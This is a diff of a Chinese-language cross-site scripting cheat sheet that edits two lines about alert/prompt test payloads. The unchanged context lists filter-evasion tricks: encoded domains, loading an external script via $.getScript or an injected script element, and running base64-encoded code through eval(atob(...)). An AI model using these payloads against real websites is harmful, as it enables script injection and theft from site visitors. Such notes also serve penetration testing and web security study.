@@ -11,14 +11,14 @@
 4.style=display:none  #设置成无显示，PS：有些标签不一定支持
 5.域名可以换成真实IP、url编码、双字节编码、16进制、8进制
 6.网站有jq可以使用$.getScript("js地址")
-7.如果alert('123')不行可以试试prompt('xss')
+7.如果//alert不行可以试试//prompt
 ```
 
 ### 常用
 
 - 变形
   ```
-  #//alert(1) 或者prompt(1) -> 网站有jq可以使用: $.getScript("js地址")
+  #//alert 或者prompt -> 网站有jq可以使用: $.getScript("js地址")
                          -> createElement('script');body.appendChild(s);s.src='js地址'>
                          -> eval(atob('YWxlcnQoJzEyMycp')) #base64接码：alert('123')
   ```
